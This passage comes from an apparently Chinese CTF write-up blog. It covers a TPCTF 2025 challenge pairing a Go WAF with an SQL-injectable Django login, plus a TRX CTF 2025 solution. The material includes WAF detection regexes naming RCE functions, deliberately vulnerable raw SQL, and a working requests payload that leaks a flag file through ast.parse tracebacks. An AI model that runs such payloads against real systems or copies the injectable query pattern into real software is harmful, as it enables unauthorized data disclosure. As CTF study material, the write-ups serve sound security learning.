%s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> r.Method == http.MethodPost &#123;<br>ct := r.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>mediaType, _, err := mime.ParseMediaType(ct)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> mediaType == <span class="hljs-string">&quot;multipart/form-data&quot;</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseMultipartForm(<span class="hljs-number">65535</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseForm(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.PostForm &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%v&quot;</span>, key, values)<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedUserAgent</span><span class="hljs-params">(userAgent <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, blocked := <span class="hljs-keyword">range</span> blockedUserAgents &#123;<br><span class="hljs-keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">reverseProxyHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>clientIP := r.RemoteAddr<br><span class="hljs-keyword">if</span> isBlockedIP(clientIP) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 IP: %s&quot;</span>, clientIP)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>bodyBytes, err := io.ReadAll(r.Body)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))<br><br><span class="hljs-keyword">if</span> isMaliciousRequest(r) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 User-Agent: %s&quot;</span>, r.UserAgent())<br><span class="hljs-keyword">return</span><br>&#125;<br><br>proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br>proxyReq.Header = r.Header<br><br>client := &amp;http.Client&#123;<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;,<br>&#125;<br><br>resp, err := client.Do(proxyReq)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> resp.Header &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;Location&quot;</span> &#123;<br>value = strings.Replace(value, backendHost, r.Host, <span class="hljs-number">-1</span>)<br>&#125;<br>w.Header().Add(key, value)<br>&#125;<br>&#125;<br>w.WriteHeader(resp.StatusCode)<br>io.Copy(w, resp.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, reverseProxyHandler)<br>log.Println(<span class="hljs-string">&quot;Listen on 0.0.0.0:8080&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:8080&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>viwe.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> connection<br><br><span class="hljs-comment"># Create your views here.</span><br><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse,HttpRequest<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> AdminUser,Blog<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>    username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>    password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>        <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>我们主要看两部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br><span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>    <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(union.\*select|select.\*from|insert.\*into|update.\*set|delete.\*from|drop\s+table|--|#|\\\*\\/|\\/\\\*)\`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell\_exec|phpinfo|popen|proc\_open|pcntl\_exec|assert)\s\*\\(.+\\))\`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(select)\`</span>)<br></code></pre></td></tr></table></figure><p>卡了很久不知道怎么 bypass</p><p>看大佬的博客知道是要利用<code>multipart/form-data</code>来bypass😅又一个知识盲点 <a href="https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/">参考1</a><a href="https://www.cnblogs.com/throwable/p/15740444.html">参考2</a></p><p>代码发现限制为 admin</p><p>看到源码逻辑就是sql的<a href="https://www.anquanke.com/post/id/253570">quine注入</a>😅怎么这么古老的又拿来考啊，关键是我还不会</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250313000506076.png" alt="image-20250313000506076"></p><p>没有复现成功，环境有点问题</p><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>看不懂,有机会复现吧</p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>难</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>难度爆大</tag>
      
      <tag>xss</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNEXT漏洞研究</title>
    <link href="/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <url>/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c61d2056093479cad791756f6bd4a1941b099c9116976da5b033af1ec91aa46">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d01c6a972f45fcd5e32e917f9e46f0a1ab08b53e9b5ad84ccac7dd269e3c4b3c3bceb8870b88672f4dfe3ca64a7ae5f83646d3edf72b74c0a2aae94f5d02e3834df2e30fe7a990ad1aae995af2fcdd00bfb6f9208cb4f3b1b20ce31a2a1d8e4bc7e92a7c0d432b800f6fff61957547c7255698f01c59ff6f0c9a9775c9e6418497316c574cf5a79761b1edbfd753c7c9c3b17e5bc7df14cf3d13e89af2263d6718ee3227db78c3137fff36b7bb57f2b66739508f773a55d1f8872e18a00a8dba40a82cc1ba6cb6e88b538ac204adf8fef8a64fcac38d0ad4c76f8fb52dfe59a5a68edbcbbc0ccefc9d29780736507d27402fef05d3ec4d207481c9ab433f58ccd5cf6fc1621114c3f5baf7a885f9606d71cf88f694181a76575a7b109e4d096b23e685b3e04ca5fbf32880360f26b8b1ca0e8516fee59b86cd6f38884f8705b541602bf62533797ee26ac17dae4f75a2d7bb104cc041e8f7df33fa61690cbb916af0cf31c69e0899d09995f04857370c7bdb32247cd96835b65ec6856f01dd39560c70b75e962e1872a07a17e9e0a7e70d2a4ff5187aa3154c55f7003698d2bced7514e376c01f4ee112026aa06abf1cab15a1c6b7c5b8a7a73d53e5ec15e58c86acb6fdfa7a510115f194d5d828352d9ff9e4a4dfa72fd165352a352447d5bf537d678e33d0f4e7fb4b71c3a7eb6b45db5bc7c55ef6f680ef6acea620bd2d73c0721067ef155efefcf147ddccc67e6f6e945c1ddde6b5deda60c08e63221b639010cbd556f788c2de6aad0c773a364e74461e5cc2a13269cffa11f4fa169804f272abe17d46227cd7200ed409e978b0941df0470209d4bfc2f0c2adffe02fddd4cb2f00f75a73b80fc1ad35cbaa7e591308640fb0d1e04d4db0f47ce82d6721eecf045cb2b54975a07b0a734999ca8d49cef2d756111e6b33a24ee073909ea53b7fa0d2299d6d1e3d5d8079fc12dba3b061887f24a87a7892c15521f8a7861262e3c00c0d31b0113e4ca56ef1e81a94fac97a974aae0e4bfddada01570bf05bd5890a9c6a4b4378150d0973cba20c10dc515b33f21724f3218eaaab83f239fdbc888474ecc6df22888b7d4e66a4a0038403015fc6b0a0fa7e269b18605bcf0d98311f1bc173e9cbc49b33a9c267e40bd725c2ed89bf007ac61f1205d719b42f3920a8a922e5d20a04f3eb13ba7b178e51b3189ec34d6a6b7efa90a427260afefcac52b37278ff4e50c70b813f0eade9d0c41735ac4079bb7ae785c276beb8b5ec46852784b47e7e791ea90ca9088858e8982c74e29c4e4f860104e390c3aacbbf0fa0152ef2b393d0ebe98f290805dd3326d3c3812753b1a91369eeff4365333dc282717c2bd6df1e514142943db635a19a34e04ba58a117ed5ed3b742bbb8db2e4c9c034a12e521b2f3cb8a8616e1908040eedf28dabb45b740a8249e2e85cb95649105b073a514138ad69dc112aa22d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nssctf新手赛</title>
    <link href="/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/"/>
    <url>/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8997cda3688733ab14a58bff80cc9d2e37330196c154de2fe4484d3cc58f9a7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlite注入</tag>
      
      <tag>linux提权</tag>
      
      <tag>时间盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TRX_CTF_2025</title>
    <link href="/2025/02/22/TRX-CTF-2025/"/>
    <url>/2025/02/22/TRX-CTF-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Online-Python-Editor"><a href="#Online-Python-Editor" class="headerlink" title="Online Python Editor"></a>Online Python Editor</h2><p>源码：</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/check&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    <span class="hljs-keyword">try</span>:<br>        ast.parse(**request.json)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-literal">None</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: traceback.format_exc()&#125;<br>        <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>secret.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Here&#x27;s the flag: &quot;</span>)<br>    <span class="hljs-built_in">print</span>(FLAG) <br>    <br>FLAG = <span class="hljs-string">&quot;TRX&#123;fake_flag_for_testing&#125;&quot;</span><br><br>main()<br></code></pre></td></tr></table></figure><p>我们的目的是获得<code>secret.py</code>的FLAG</p><p>再<code>app.py</code>的check路由会解析传入的json内容构造ast语法树，而且会返回错误信息，这可能是一个利用点</p><p><code>ast</code>解析是不能执行命令的，只会检查语法，所有我们只能通过报错来拿到FLAG</p><p>Python的AST（抽象语法树）模块在解析代码时，会逐行检查语法结构。如果代码中存在语法错误，解析器会抛出异常并<strong>终止解析</strong>，同时生成详细的错误信息，包括</p><ul><li>文件名</li><li>出错行号</li><li>改行内容</li></ul><p>那么我们可以构建请求通过设置<code>filename=&quot;secret.py&quot;</code>再换行到第六行，再报错返回第六行内容</p><p>最终payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://python.ctf.theromanxpl0.it:7001/check&#x27;</span><br>data = &#123;<br>  <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&quot;\n\n\n\n\ninvalid syntax&quot;</span>,<br>  <span class="hljs-string">&quot;filename&quot;</span>: <span class="hljs-string">&quot;secret.py&quot;</span><br>&#125;<br><br>response = requests.post(url, json=data)<br><span class="hljs-built_in">print</span>(response.json())<br><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250223004820425.png" alt="image-20250223004820425"></p><h2 id="zStego"><a href="#zStego" class="headerlink" title="zStego"></a>zStego</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;REL_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;word/_rels/document.xml.rels&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hellYeah</span>(<span class="hljs-params"><span class="hljs-variable">$code</span>, <span class="hljs-variable">$msg</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$code</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$msg</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* sanity checks */</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">405</span>, <span class="hljs-string">&#x27;Invalid request method.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Please upload a file.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">500</span>, <span class="hljs-string">&#x27;Upload error.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-string">&#x27;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#x27;</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Please upload a Word document!&#x27;</span>);<br><br><br><span class="hljs-comment">/* processing uploaded Word - valid document contains relationship table */</span><br><br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$zipFilename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFilename</span>) !== <span class="hljs-literal">true</span> || <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">locateName</span>(REL_FILENAME) === <span class="hljs-literal">false</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;File is not a valid Word document.&#x27;</span>);<br><br><span class="hljs-variable">$relsDom</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getFromName</span>(REL_FILENAME));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$relsDom</span> === <span class="hljs-literal">false</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid object relationship table. Document may be corrupted.&#x27;</span>);<br><br><br><span class="hljs-comment">/* extract document&#x27;s &quot;media&quot; folder into a temporary directory */</span><br><span class="hljs-variable">$tmpDir</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX&quot;</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;unzip <span class="hljs-subst">$zipFilename</span> \&quot;word/media*\&quot; -d \&quot;<span class="hljs-subst">$tmpDir</span>\&quot;&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanup</span>(<span class="hljs-params"><span class="hljs-variable">$tmpDir</span></span>) </span>&#123; <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;rm -rf <span class="hljs-subst">$tmpDir</span>&quot;</span>); &#125;<br><span class="hljs-title function_ 